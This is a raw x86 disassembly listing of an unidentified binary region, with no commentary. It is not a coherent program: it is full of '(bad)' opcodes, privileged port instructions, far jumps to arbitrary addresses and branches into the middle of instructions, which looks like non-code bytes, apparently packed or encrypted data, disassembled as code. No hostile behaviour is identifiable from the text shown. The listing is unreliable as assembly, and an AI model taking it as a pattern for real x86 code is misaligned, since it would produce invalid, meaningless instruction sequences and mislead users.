  4065b7:	mov    ecx,0xa18b7bc0
  4065bc:	sub    eax,0xc1e2a242
  4065c1:	mov    WORD PTR [ecx+0x50],ss
  4065c4:	pop    esi
  4065c5:	aam    0x83
  4065c7:	iret   
  4065c8:	jmp    0x9691e008
  4065cd:	pusha  
  4065ce:	jbe    0x406614
  4065d0:	std    
  4065d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065d2:	in     eax,dx
  4065d3:	je     0x406590
  4065d5:	or     ah,bh
  4065d7:	add    cl,BYTE PTR [ebp+0x16]
  4065da:	mov    dh,0x25
  4065dc:	dec    edi
  4065dd:	lock pusha 
  4065df:	inc    ecx
  4065e0:	out    0xae,eax
  4065e2:	test   DWORD PTR [ecx+0x5cc282c0],esp
  4065e8:	stc    
  4065e9:	xor    al,0x11
  4065eb:	sub    dh,BYTE PTR [ebx]
  4065ed:	mov    eax,DWORD PTR [eax]
  4065ef:	and    DWORD PTR [eax],ebx
  4065f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065f2:	retf   
  4065f3:	cli    
  4065f4:	inc    ebx
  4065f5:	(bad)  
  4065f6:	or     BYTE PTR [edi-0x7991ba23],ch
  4065fc:	mov    dl,0xa4
  4065fe:	xor    ebx,DWORD PTR [eax-0x280a749a]
  406604:	sub    eax,0xaa211fa8
  406609:	repz cmp esp,DWORD PTR [eax-0x74fd9f09]
  406610:	fbld   TBYTE PTR [ebx+ebx*1-0x31c398cc]
  406617:	iret   
  406618:	inc    eax
  406619:	popf   
  40661a:	ins    DWORD PTR es:[edi],dx
  40661b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40661c:	shl    DWORD PTR [eax-0x47],cl
  40661f:	mov    dh,0x1f
  406621:	aad    0xb
  406623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406624:	(bad)  
  406625:	adc    ch,dh
  406627:	jo     0x4065cc
  406629:	pop    es
  40662a:	aaa    
  40662b:	xchg   ecx,eax
  40662c:	cld    
  40662d:	and    bh,al
  40662f:	mov    al,ds:0x72d81039
  406634:	fimul  DWORD PTR [esi]
  406636:	jne    0x4065bb
  406638:	pop    esi
  406639:	mov    ds:0x509d829b,al
  40663e:	retf   0x3b6
  406641:	pusha  
  406642:	push   esp
  406643:	dec    esp
  406644:	xchg   edx,eax
  406645:	and    dl,BYTE PTR [ebx-0x564f2ad0]
  40664b:	adc    bl,BYTE PTR [ebx-0x65]
  40664e:	popa   
  40664f:	aam    0x11
  406651:	lods   eax,DWORD PTR ds:[si]
  406653:	(bad)  
  406655:	push   ebx
  406656:	cmp    bl,BYTE PTR [ebx]
  406658:	cmp    DWORD PTR [ecx-0x2f],esp
  40665b:	leave  
  40665c:	aaa    
  40665d:	imul   ebp,DWORD PTR [edx-0x3955d0ee],0xffffffc2
  406664:	dec    ecx
  406665:	popa   
  406666:	iret   
  406667:	add    eax,0x9d8e7a7a
  40666c:	div    DWORD PTR [esi-0x755f5edd]
  406672:	ds loope 0x406653
  406675:	sub    al,0x1d
  406677:	cli    
  406678:	lock mov BYTE PTR [eax],al
  40667b:	dec    ebp
  40667c:	mov    edx,0x74e7ee94
  406681:	retf   
  406682:	push   0x67
  406684:	pop    ds
  406685:	popa   
  406686:	sbb    bl,BYTE PTR [eax+0x7f]
  406689:	xor    BYTE PTR [ebx-0x1119cbce],al
  40668f:	imul   DWORD PTR [edx+eax*1-0x1c036006]
  406696:	adc    eax,0x17e352a2
  40669b:	mov    ecx,0x78aa03a7
  4066a0:	ret    
  4066a1:	ins    BYTE PTR es:[edi],dx
  4066a2:	add    DWORD PTR [ecx],edi
  4066a4:	into   
  4066a5:	fsubr  DWORD PTR [esi+0x69]
  4066a8:	mov    esi,0x9dd6f940
  4066ad:	pusha  
  4066ae:	test   BYTE PTR [ebp+0x5b69c46c],bl
  4066b4:	stc    
  4066b5:	test   esi,ebp
  4066b7:	ror    BYTE PTR [edi],0x8b
  4066ba:	mov    ds:0x74b2698d,eax
  4066bf:	cwde   
  4066c0:	pop    ebx
  4066c1:	js     0x40665a
  4066c3:	mov    eax,ds:0xcf77b97c
  4066c8:	scas   eax,DWORD PTR es:[edi]
  4066c9:	sbb    ch,dh
  4066cb:	jmp    0x22f3eddd
  4066d0:	xchg   ebp,eax
  4066d1:	pop    edx
  4066d2:	outs   dx,BYTE PTR ds:[esi]
  4066d3:	mov    ds:0xb7d17328,al
  4066d8:	mov    ecx,0x1c5107a7
  4066dd:	add    DWORD PTR [ebx+0x43],ecx
  4066e0:	xor    eax,0x33a12ecb
  4066e5:	mov    esi,0xba254838
  4066ea:	fsub   DWORD PTR [eax+0x7791520b]
  4066f0:	jbe    0x406750
  4066f2:	or     BYTE PTR [ebp+0x5f],ch
  4066f5:	out    0x3,eax
  4066f7:	and    DWORD PTR [esi+0x4868e498],ebx
  4066fd:	mov    bh,0x3b
  4066ff:	mov    eax,ds:0xd32b00b9
  406704:	pushf  
  406705:	fdivp  st(5),st
  406707:	pop    ds
  406708:	pop    esi
  406709:	sub    DWORD PTR [ecx-0x31],ebx
  40670c:	loope  0x406722
  40670e:	cmp    al,0xa0
  406710:	les    edx,FWORD PTR [ebp-0xb]
  406713:	push   eax
  406714:	mov    edx,0x53c46e59
  406719:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40671a:	std    
  40671b:	pop    esp
  40671c:	pop    esi
  40671d:	push   ebx
  40671e:	xchg   edx,eax
  40671f:	and    DWORD PTR [eax+0x2a3a1848],0x2f
  406726:	mov    BYTE PTR [ecx+0x1d9480ab],ah
  40672c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40672d:	push   ebx
  40672e:	sub    al,BYTE PTR [edi-0x7f8c09a2]
  406734:	sbb    BYTE PTR [ebp-0x1f],0x1d
  406738:	aaa    
  406739:	pop    esi
  40673a:	and    DWORD PTR [edi+0x1e],esp
  40673d:	cmp    al,0xfe
  40673f:	push   eax
  406740:	jae    0x406792
  406742:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  406744:	scas   al,BYTE PTR es:[edi]
  406745:	sub    esi,0xadfccf7c
  40674b:	call   0x681a:0xccb6394a
  406752:	out    dx,al
  406753:	xchg   edx,eax
  406754:	dec    edi
  406755:	add    DWORD PTR [esi-0x114d55d7],esi
  40675b:	fs loope 0x40672d
  40675e:	je     0x406737
  406760:	dec    ebx
  406761:	mov    ecx,0x6ce6a181
  406766:	and    dl,cl
  406768:	push   es
  406769:	and    eax,0x9a5eb840
  40676e:	dec    eax
  40676f:	(bad)  
  406770:	icebp  
  406771:	fisttp WORD PTR [ebp+0x6060c280]
  406777:	(bad)  
  406778:	xchg   ebp,eax
  406779:	inc    esp
  40677a:	cmp    BYTE PTR [ebx+eiz*2+0x72],cl
  40677e:	jmp    0x40676a
  406780:	or     ebx,DWORD PTR [ebp-0x1f3cb955]
  406786:	mov    esp,0x3f61bf75
  40678b:	cmp    BYTE PTR [esi+0x5b],dh
  40678e:	sti    
  40678f:	or     al,0xc5
  406791:	add    eax,0x2fe76190
  406796:	fldcw  WORD PTR [esi+ebx*2]
  406799:	fwait
  40679a:	ds mov edx,0xfab4b413
  4067a0:	push   eax
  4067a1:	popa   
  4067a2:	or     BYTE PTR [ecx-0x34],dh
  4067a5:	in     al,dx
  4067a6:	and    ah,BYTE PTR [ebp-0x50119ce0]
  4067ac:	push   cs
  4067ad:	jae    0x4067ca
  4067af:	nop
  4067b0:	mov    ebx,edx
  4067b2:	cmp    eax,0xfbe9c3a1
  4067b7:	sub    DWORD PTR [edi+0x5e03c0f9],0x43d4068d
  4067c1:	sub    ecx,DWORD PTR [edx]
  4067c3:	das    
  4067c4:	inc    edi
  4067c5:	popa   
  4067c6:	fs stos BYTE PTR es:[edi],al
  4067c8:	lods   eax,DWORD PTR ds:[esi]
  4067c9:	repz (bad) 
  4067cb:	and    esp,DWORD PTR [ecx-0x3d341146]
  4067d1:	(bad)  
  4067d2:	jae    0x4067d1
  4067d4:	imul   BYTE PTR ds:0xabd48cea
  4067da:	mov    ch,0x20
  4067dc:	xchg   esi,eax
  4067dd:	iret   
  4067de:	dec    edi
  4067df:	jp     0x40682a
  4067e1:	mov    cl,0x54
  4067e3:	push   edx
  4067e4:	pop    esi
  4067e5:	xor    al,0xe5
  4067e7:	iret   
  4067e8:	out    0x85,eax
  4067ea:	lods   al,BYTE PTR ds:[esi]
  4067eb:	xchg   esi,eax
  4067ec:	imul   esp,DWORD PTR [eax-0x1a],0x54578202
  4067f3:	or     bl,0xa1
  4067f6:	out    dx,al
  4067f7:	fwait
  4067f8:	fs dec eax
  4067fa:	idiv   ah
  4067fc:	xor    ah,dh
  4067fe:	mov    esi,0x33cc49a0
  406803:	bound  eax,QWORD PTR [ecx+0x5df35c1f]
  406809:	fsub   st,st(1)
  40680b:	out    dx,al
  40680c:	in     al,0x79
  40680e:	inc    ecx
  40680f:	mov    dh,0x2e
  406811:	sub    eax,0xbf27a190
  406816:	addr16 jg 0x40682e
  406819:	cmp    DWORD PTR [eax-0x19c8a101],0xffffff94
  406820:	(bad)  [esi-0x3]
  406823:	dec    edx
  406824:	jns    0x406854
  406826:	cmp    eax,0xce71aea0
  40682b:	lods   eax,DWORD PTR ds:[esi]
  40682c:	ficom  WORD PTR [ecx-0x56e91001]
  406832:	es mov edx,0x6fb1e11a
  406838:	outs   dx,DWORD PTR ds:[esi]
  406839:	cmp    al,0x47
  40683b:	inc    ebx
  40683c:	xchg   ebp,eax
  40683d:	push   ecx
  40683e:	adc    al,BYTE PTR [edi-0x356c303c]
  406844:	fidiv  WORD PTR [ebx+0x6]
  406847:	xchg   ebp,eax
  406848:	xor    DWORD PTR [edi-0x19],esi
  40684b:	popa   
  40684c:	into   
  40684d:	jne    0x4068c2
  40684f:	dec    ecx
  406850:	sahf   
  406851:	fwait
  406852:	mov    ds:0xc860b475,al
  406857:	jl     0x406813
  406859:	sub    BYTE PTR [ecx],bl
  40685b:	and    BYTE PTR [edi-0x17],0x2
  40685f:	hlt    
  406860:	mov    edi,0xa7c3701c
  406865:	pop    edi
  406866:	add    esi,DWORD PTR [eax+0x61aeec86]
  40686c:	jnp    0x4068cd
  40686e:	sub    BYTE PTR [edx-0x2c9193bd],0xdf
  406875:	mov    bl,0x33
  406877:	div    BYTE PTR [ecx]
  406879:	or     ebp,esi
  40687b:	retf   0x50bd
  40687e:	fistp  WORD PTR ds:0xa17bb5d0
  406884:	xchg   edi,eax
  406885:	ficom  DWORD PTR [edi+ecx*1+0x3b]
  406889:	std    
  40688a:	ret    
  40688b:	mov    ebx,DWORD PTR [ebp-0x40]
  40688e:	push   esi
  40688f:	fistp  DWORD PTR [eax]
  406891:	pop    ds
  406892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406893:	loopne 0x40682d
  406895:	lahf   
  406896:	inc    edx
  406897:	mov    ebp,0x96b8e7ee
  40689c:	sub    ch,BYTE PTR [eax]
  40689e:	and    BYTE PTR [ecx+0x117951a],0x60
  4068a5:	xor    bh,ch
  4068a7:	fwait
  4068a8:	cmp    eax,0x1d1094c1
  4068ad:	pusha  
  4068ae:	and    al,0xa6
  4068b0:	pop    edx
  4068b1:	pop    ss
  4068b2:	dec    esi
  4068b3:	fdivrp st(3),st
  4068b5:	pusha  
  4068b6:	mov    ch,0x67
  4068b8:	pop    ebx
  4068b9:	loopne 0x406895
  4068bb:	inc    ebx
  4068bc:	in     eax,dx
  4068bd:	jge    0x4068ad
  4068bf:	xchg   ecx,eax
  4068c0:	sbb    ecx,edi
  4068c2:	xchg   BYTE PTR [edi],bh
  4068c4:	(bad)  
  4068c5:	pop    ebp
  4068c6:	js     0x406869
  4068c8:	mov    edx,0xe3b66e3
  4068cd:	xlat   BYTE PTR ds:[ebx]
  4068ce:	popa   
  4068cf:	xchg   DWORD PTR [esi-0x54],ebx
  4068d2:	xor    al,0x37
  4068d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068d5:	push   cs
  4068d6:	jl     0x406894
  4068d8:	cld    
  4068d9:	pusha  
  4068da:	fimul  WORD PTR [edi+0x69eb495d]
  4068e0:	daa    
  4068e1:	fucomp st(3)
  4068e3:	jge    0x4068e7
  4068e5:	mov    bh,ah
  4068e7:	dec    esp
  4068e8:	ret    
  4068e9:	lock xchg ecx,eax
  4068eb:	sub    al,0xf0
  4068ed:	push   edi
  4068ee:	lahf   
  4068ef:	test   BYTE PTR [eax],dl
  4068f1:	sub    esi,0x2e
  4068f4:	xlat   BYTE PTR ds:[ebx]
  4068f5:	jno    0x4068ed
  4068f7:	pushf  
  4068f8:	pop    esi
  4068f9:	retf   
  4068fa:	dec    edi
  4068fb:	sub    edx,DWORD PTR [ecx-0x10]
  4068fe:	inc    ecx
  4068ff:	mov    edi,0xbaca60b2
  406904:	and    DWORD PTR [esi+0x66],0xeed41236
  40690b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40690c:	out    dx,al
  40690d:	pop    ss
  40690e:	aam    0x70
  406910:	push   ss
  406911:	dec    esp
  406912:	mov    esi,0x9d8ff68d
  406917:	push   edi
  406918:	test   al,0x60
  40691a:	call   0x2003b6a8
  40691f:	je     0x406933
  406921:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406922:	pop    ds
  406923:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406924:	mov    esp,0xb483a3d0
  406929:	mov    BYTE PTR [edi-0x33],bl
  40692c:	xor    BYTE PTR [esi-0x18],bl
  40692f:	mov    dl,BYTE PTR [esi]
  406931:	fwait
  406932:	pop    ds
  406933:	cmp    DWORD PTR [ebx-0x3a3ecf50],0x92540373
  40693d:	sub    BYTE PTR [eax+0x39],ch
  406940:	pslld  mm2,mm4
  406943:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406944:	xor    ecx,DWORD PTR [eax+eax*8+0x2]
  406948:	aam    0xa0
  40694a:	sbb    eax,DWORD PTR [esi+0x7eeea0ac]
  406950:	cmp    DWORD PTR [ecx-0x39aa6226],esi
  406956:	shl    BYTE PTR [eax+0xd32c697],1
  40695c:	shl    BYTE PTR [esp+edi*8-0x67],1
  406960:	pop    esi
  406961:	out    0xdb,al
  406963:	es or  al,0xaa
  406967:	xchg   edi,eax
  406968:	lea    ebx,[ecx-0x22]
  40696b:	mov    BYTE PTR [eax],0xd3
  40696e:	aad    0xd7
  406970:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406971:	and    BYTE PTR [eax-0x4920fcdf],ch
  406977:	lds    ecx,FWORD PTR [ebx]
  406979:	popa   
  40697a:	pusha  
  40697b:	lock xor dh,0xf3
  40697f:	loop   0x406964
  406981:	pusha  
  406982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406983:	enter  0x7c8d,0x6
  406987:	ds xchg esi,eax
  406989:	ja     0x4069ed
  40698b:	mov    al,0x5e
  40698d:	dec    ebx
  40698e:	jmp    0x18dd371
  406993:	repz iret 
  406995:	jmp    DWORD PTR gs:[eax]
  406998:	pop    edx
  406999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40699a:	dec    ecx
  40699b:	fdiv   st,st(5)
  40699d:	loopne 0x4069e2
  40699f:	ins    DWORD PTR es:[edi],dx
  4069a0:	cmp    BYTE PTR [ebx],0xee
  4069a3:	addr16 mov ah,0x79
  4069a6:	outs   dx,DWORD PTR ds:[esi]
  4069a7:	iret   
  4069a8:	jg     0x406990
  4069aa:	test   BYTE PTR [edx-0x4e],al
  4069ad:	pop    eax
  4069ae:	into   
  4069af:	stos   DWORD PTR es:[edi],eax
  4069b0:	std    
  4069b1:	pusha  
  4069b2:	push   esi
  4069b3:	pop    edi
  4069b4:	add    DWORD PTR [ecx-0x50],0xeee40427
  4069bb:	mov    bl,0x1
  4069bd:	lea    ebx,[ebx-0x53]
  4069c0:	cs ja  0x406a41
  4069c3:	scas   eax,DWORD PTR es:[edi]
  4069c4:	dec    ecx
  4069c5:	cmp    esi,ebp
  4069c7:	ss aaa 
  4069c9:	push   0x54
  4069cb:	inc    ecx
  4069cc:	adc    eax,0xa5eaee14
  4069d1:	rcr    dh,cl
  4069d3:	or     esp,ecx
  4069d5:	pop    edi
  4069d6:	mov    al,0xa0
  4069d8:	xchg   BYTE PTR [eax+ebp*2-0x47],cl
  4069dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069dd:	cmp    al,0xf0
  4069df:	or     ebx,DWORD PTR [esi-0x1f]
  4069e2:	pusha  
  4069e3:	test   DWORD PTR [ecx],esp
  4069e5:	adc    dh,BYTE PTR [edx+edi*4-0x52]
  4069e9:	push   edx
  4069ea:	lds    ebx,FWORD PTR gs:[esp+ecx*1]
  4069ee:	out    dx,al
  4069ef:	shl    BYTE PTR [esi],0xb2
  4069f2:	dec    ebx
  4069f3:	xchg   ebx,eax
  4069f4:	mov    esi,0x5ea8fbb1
  4069f9:	xor    BYTE PTR [ebx],0x8b
  4069fc:	inc    eax
  4069fd:	retf   
  4069fe:	int3   
  4069ff:	push   edx
  406a00:	inc    ebp
  406a01:	pusha  
  406a02:	jns    0x4069f3
  406a04:	and    ebp,DWORD PTR [edi-0x43544c42]
  406a0a:	jecxz  0x4069f0
  406a0c:	pop    edi
  406a0d:	pop    edx
  406a0e:	lods   al,BYTE PTR ds:[esi]
  406a0f:	pop    ebp
  406a10:	ja     0x406a8b
  406a12:	clc    
  406a13:	js     0x4069bc
  406a15:	xchg   edi,eax
  406a16:	(bad)  
  406a17:	mov    al,ds:0x1ac88d85
  406a1c:	repnz mov esi,ss
  406a1f:	neg    DWORD PTR [ebx+0x47]
  406a22:	xchg   ebx,eax
  406a23:	or     esp,eax
  406a25:	dec    ebp
  406a26:	(bad)  [ebp-0x1b]
  406a29:	add    al,0xae
  406a2b:	sub    edi,DWORD PTR [eax+0x5da19ba0]
  406a31:	(bad)  
  406a33:	inc    ecx
  406a34:	or     BYTE PTR [eax],dh
  406a36:	jmp    0x37bd:0x85f05e65
  406a3d:	mov    esi,DWORD PTR [ecx]
  406a3f:	in     eax,dx
  406a40:	(bad)  
  406a41:	pusha  
  406a42:	pop    ds
  406a43:	fldenv [ebx-0x671ae22e]
  406a49:	jmp    0x406a39
  406a4b:	mov    ds:0x8fd28ee1,eax
  406a50:	fyl2xp1 
  406a52:	mov    ebx,0x370971a0
  406a57:	retf   0x8c2b
  406a5a:	dec    ecx
  406a5b:	jo     0x406abb
  406a5d:	arpl   WORD PTR [ecx-0x29bf02c4],cx
  406a63:	(bad)  
  406a64:	jmp    0x8622:0xff134171
  406a6b:	enter  0xb402,0xf2
  406a6f:	mov    esp,0xb6b1aef5
  406a74:	mov    al,0x60
  406a76:	ins    BYTE PTR es:[edi],dx
  406a77:	adc    eax,0x13bcf7f1
  406a7c:	add    eax,0xd6eceed1
  406a81:	das    
  406a82:	scas   eax,DWORD PTR es:[edi]
  406a83:	in     al,0x67
  406a85:	fidivr WORD PTR [eax-0x5f]
  406a88:	js     0x406a31
  406a8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a8b:	dec    esp
  406a8c:	and    al,0xb5
  406a8e:	cli    
  406a8f:	adc    DWORD PTR [edx],0x45a16182
  406a95:	mov    ds:0xee4dcf33,al
  406a9a:	loop   0x406a28
  406a9c:	daa    
  406a9d:	je     0x406b0f
  406a9f:	popa   
  406aa0:	lock outs dx,DWORD PTR ds:[esi]
  406aa2:	in     eax,0xf
  406aa4:	adc    edx,esp
  406aa6:	out    dx,eax
  406aa7:	popf   
  406aa8:	sbb    BYTE PTR [ecx],0x9
  406aab:	loope  0x406a2f
  406aad:	push   ebp
  406aae:	sbb    BYTE PTR [ebp+ebx*2+0x7b],dl
  406ab2:	cmp    eax,0x25bca33
  406ab7:	sbb    eax,0xcf315a11
  406abc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406abd:	(bad)  [esi+0x72]
  406ac0:	mov    dh,0x34
  406ac2:	stos   DWORD PTR es:[edi],eax
  406ac3:	jbe    0x406b20
  406ac5:	outs   dx,DWORD PTR ds:[esi]
  406ac6:	push   eax
  406ac7:	xchg   edx,eax
  406ac8:	dec    ecx
  406ac9:	std    
  406aca:	ficomp WORD PTR [ebx]
  406acc:	cwde   
  406acd:	push   ds
  406ace:	imul   esp,DWORD PTR [ecx-0x305f53f4],0xdca42e2c
  406ad8:	pop    esi
  406ad9:	pop    edx
  406ada:	clc    
  406adb:	ss retf 
  406add:	dec    ebp
  406ade:	fucomp st(7)
  406ae0:	push   esp
  406ae1:	shl    DWORD PTR [ecx-0x112b9f50],1
  406ae7:	or     BYTE PTR [ebx+eiz*2+0xa59868b],0xe9
  406aef:	idiv   BYTE PTR es:[edi]
  406af2:	in     eax,dx
  406af3:	cmp    bh,bl
  406af5:	mov    ecx,0x993b3bea
  406afa:	mov    al,ds:0x19614834
  406aff:	xlat   BYTE PTR ds:[ebx]
  406b00:	call   0x3f763795
  406b05:	xchg   edi,eax
  406b06:	in     al,dx
  406b07:	mov    esp,0x1318bab
  406b0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b0d:	inc    eax
  406b0e:	xor    bh,BYTE PTR [esi]
  406b10:	mov    edx,0xa2f26a60
  406b15:	mov    edi,0x86063b83
  406b1a:	add    eax,esi
  406b1c:	out    0x63,eax
  406b1e:	out    dx,al
  406b1f:	(bad)  
  406b20:	outs   dx,BYTE PTR ds:[esi]
  406b21:	cmp    BYTE PTR [ecx-0x589ed96f],0x6
  406b28:	jae    0x406b28
  406b2a:	push   eax
  406b2b:	mov    bh,0xc3
  406b2d:	clc    
  406b2e:	out    dx,al
  406b2f:	jne    0x406abc
  406b31:	pop    edx
  406b32:	mov    eax,0xd9d41ac6
  406b37:	icebp  
  406b38:	sti    
  406b39:	pusha  
  406b3a:	je     0x406ad6
  406b3c:	push   cs
  406b3d:	ss push 0xee2d36c4
  406b43:	pop    esp
  406b44:	cmc    
  406b45:	sbb    esi,eax
  406b47:	std    
  406b48:	into   
  406b49:	mov    dh,0x7b
  406b4b:	mov    eax,ds:0x283c103
  406b50:	es sti 
  406b52:	into   
  406b53:	xchg   ebx,eax
  406b54:	xor    bl,BYTE PTR [esi+0x46]
  406b57:	and    DWORD PTR [edx+0x21f853b3],esp
  406b5d:	enterw 0xba0,0x29
  406b62:	hlt    
  406b63:	(bad)  
  406b64:	out    0x4e,eax
  406b66:	in     eax,0x29
  406b68:	pop    edi
  406b69:	dec    esi
  406b6a:	jnp    0x406b81
  406b6c:	(bad)  
  406b6d:	rcr    BYTE PTR [edi+0x3aeabb3a],1
  406b73:	xor    al,0x68
  406b75:	popa   
  406b76:	ins    DWORD PTR es:[edi],dx
  406b77:	cmp    al,0x14
  406b79:	les    eax,FWORD PTR [ebp-0x116612d9]
  406b7f:	mov    cs,WORD PTR [edx-0x18517423]
  406b85:	aaa    
  406b86:	cmp    esp,DWORD PTR [ebp+ecx*8+0x461d953b]
  406b8d:	pop    edi
  406b8e:	push   esi
  406b8f:	mov    al,ds:0x59ee1833
  406b94:	test   esi,ebp
  406b96:	mov    eax,ds:0x4f48d0f3
  406b9b:	popf   
  406b9c:	pop    ecx
  406b9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b9e:	push   ds
  406b9f:	mov    eax,0xcdef39f4
  406ba4:	(bad)  
  406ba5:	(bad)  [eax]
  406ba7:	loope  0x406b92
  406ba9:	std    
  406baa:	add    eax,0xdb5351a9
  406baf:	xor    dh,BYTE PTR [edx-0x15]
  406bb2:	into   
  406bb3:	fcmovu st,st(3)
  406bb5:	aad    0x94
  406bb7:	sahf   
  406bb8:	pop    esi
  406bb9:	pop    ebx
  406bba:	push   es
  406bbb:	add    cl,BYTE PTR [ecx+0x37295388]
  406bc1:	bound  eax,QWORD PTR [ebp+0xb7ede45]
  406bc7:	neg    DWORD PTR [edx]
  406bc9:	in     al,dx
  406bca:	or     eax,0x279f5d78
  406bcf:	rol    cl,cl
  406bd1:	loopne 0x406bd8
  406bd3:	(bad)  
  406bd4:	(bad)  
  406bd5:	pop    edi
  406bd6:	in     eax,0x8d
  406bd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bd9:	mov    ebp,0x74b9e607
  406bde:	punpcklwd mm2,DWORD PTR [ecx+esi*4+0x5b]
  406be3:	scas   eax,DWORD PTR es:[edi]
  406be4:	pop    edi
  406be5:	std    
  406be6:	add    BYTE PTR ds:0x2bd40e31,ch
  406bec:	or     ecx,edi
  406bee:	pop    eax
  406bef:	ret    0x530a
  406bf2:	aas    
  406bf3:	(bad)  
  406bf5:	into   
  406bf6:	dec    esi
  406bf7:	jno    0x406bdc
  406bf9:	out    0x64,al
  406bfb:	xor    esp,DWORD PTR [ecx+eiz*1-0x4b]
  406bff:	sub    eax,0x49bfa123
  406c04:	jle    0x406b95
  406c06:	and    BYTE PTR [ecx-0x3720ff0b],ah
  406c0c:	clc    
  406c0d:	or     ch,BYTE PTR [ecx+0x2de65ee4]
  406c13:	cmp    ebx,ebx
  406c15:	add    DWORD PTR [edi+0x51],edx
  406c18:	jno    0x406c7a
  406c1a:	lock pop ss
  406c1c:	std    
  406c1d:	fild   QWORD PTR [ecx+edi*8-0x7a5fb0c]
  406c24:	arpl   WORD PTR [eax],cx
  406c26:	lods   eax,DWORD PTR ds:[esi]
  406c27:	cwde   
  406c28:	sahf   
  406c29:	pusha  
  406c2a:	mov    edx,0x6b31172b
  406c2f:	mov    eax,ds:0x3502fa69
  406c34:	test   al,0x34
  406c36:	imul   ecx,DWORD PTR [esi-0x5f8f1ba2],0x1405b0e3
  406c40:	cmp    ebx,DWORD PTR [esi-0x3a]
  406c43:	imul   ecx,DWORD PTR [ebx+eiz*1+0x387eea56],0xbe59bd10
  406c4e:	dec    esi
  406c4f:	cmp    al,0x30
  406c51:	xchg   esp,eax
  406c52:	out    dx,al
  406c53:	ins    BYTE PTR es:[edi],dx
  406c54:	mov    ch,0x37
  406c56:	jmp    0x13833750
  406c5b:	cmp    ebx,ebp
  406c5d:	data16 outs dx,BYTE PTR ds:[esi]
  406c5f:	enter  0xcf94,0x21
  406c63:	out    dx,al
  406c64:	mov    dl,0x46
  406c66:	in     eax,dx
  406c67:	mov    WORD PTR [edi],es
  406c69:	outs   dx,BYTE PTR ds:[esi]
  406c6a:	in     eax,dx
  406c6b:	inc    eax
  406c6c:	mov    bl,ah
  406c6e:	fisubr WORD PTR [edi]
  406c70:	shl    DWORD PTR [eax-0x30],1
  406c73:	imul   edx,DWORD PTR ds:0xb39a5a7e,0x77
  406c7a:	out    dx,al
  406c7b:	dec    esi
  406c7c:	mov    edi,0x89c78cc2
  406c81:	arpl   WORD PTR [eax-0x5f],bp
  406c84:	pop    edi
  406c85:	and    BYTE PTR [edi+0x6b],0x1b
  406c89:	cmp    BYTE PTR [esi+0x768e4bfb],dl
  406c8f:	js     0x406ce4
  406c91:	(bad)  
  406c93:	clc    
  406c94:	in     al,0x46
  406c96:	dec    esi
  406c97:	cs gs (bad) 
  406c9a:	pop    ecx
  406c9b:	mov    eax,ds:0xa9febbbb
  406ca0:	inc    esi
  406ca1:	rol    ah,1
  406ca3:	dec    esi
  406ca4:	pop    esi
  406ca5:	cmp    al,0x48
  406ca7:	test   DWORD PTR [eax],edx
  406ca9:	nop
  406caa:	push   ds
  406cab:	out    0x8a,al
  406cad:	pusha  
  406cae:	shl    DWORD PTR [ebx+0x49],0x66
  406cb2:	or     al,0xf8
  406cb4:	les    edi,FWORD PTR [esi]
  406cb6:	out    dx,al
  406cb7:	mov    eax,0x741db64f
  406cbc:	rcr    DWORD PTR [ebx-0x68],cl
  406cbf:	mov    eax,ds:0xdc0764c5
  406cc4:	not    DWORD PTR [edx+esi*2-0x1364a176]
  406ccb:	bound  ebp,QWORD PTR [edx+0x34ecd5dd]
  406cd1:	popa   
  406cd2:	cmovae edx,DWORD PTR [edi+0x7d]
  406cd6:	xchg   ax,ax
  406cd8:	and    ebp,DWORD PTR [ebx-0x23]
  406cdb:	ret    0x2bce
  406cde:	out    dx,al
  406cdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ce0:	fistp  WORD PTR [edx-0x79]
  406ce3:	sub    ah,bh
  406ce5:	and    ebp,DWORD PTR [ebp-0x5f74a95f]
  406ceb:	xchg   edx,eax
  406cec:	lahf   
  406ced:	test   eax,0xa4a82115
  406cf2:	mov    BYTE PTR [esi],ah
  406cf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cf5:	idiv   DWORD PTR [ebp-0x52ccc574]
  406cfb:	mov    al,ds:0x821669af
  406d00:	addr16 sub dh,ch
  406d03:	inc    DWORD PTR [ecx-0x1e7503d]
  406d09:	xlat   BYTE PTR ds:[ebx]
  406d0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d0b:	mov    eax,ds:0x418b584e
  406d10:	or     al,0x1a
  406d12:	add    esi,DWORD PTR [ebp+0x6e51395e]
  406d18:	jecxz  0x406d35
  406d1a:	ja     0x406cf5
  406d1c:	xchg   ebx,eax
  406d1d:	je     0x406d56
  406d1f:	and    dh,BYTE PTR [ebx+eiz*2-0x62a35b91]
  406d26:	stos   DWORD PTR es:[edi],eax
  406d27:	sbb    BYTE PTR [ebp+ecx*1-0x65],al
  406d2b:	mov    ebp,0x138d43ae
  406d30:	pop    esi
  406d31:	test   eax,0xa59cb355
  406d36:	fcomp  DWORD PTR [ebp+0x22]
  406d39:	rcr    eax,1
  406d3b:	mov    al,ds:0x466e44e5
  406d40:	loopne 0x406cda
  406d42:	xor    al,0x90
  406d44:	inc    esp
  406d45:	(bad)
  406d48:	pop    esi
